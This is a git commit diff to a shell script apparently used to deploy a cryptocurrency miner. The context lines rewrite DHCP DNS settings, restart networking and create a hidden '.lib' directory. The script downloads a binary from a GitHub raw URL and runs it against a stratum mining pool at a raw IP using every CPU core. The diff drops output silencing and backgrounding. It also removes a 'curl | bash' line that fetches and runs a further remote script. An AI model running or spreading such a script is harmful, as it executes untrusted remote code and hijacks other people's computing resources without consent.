2cef67c17d887cf69266cef8c91660ab41c33967
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-18 03:05:48 -0700

    Update .sh

--- .sh
+++ .sh
@@ -11,7 +11,6 @@ rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner > /dev/null 2>&1
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner
 chmod u+x sgr1
-./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/loeto21/lieur/raw/main/puyeng.sh | bash
+./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) 
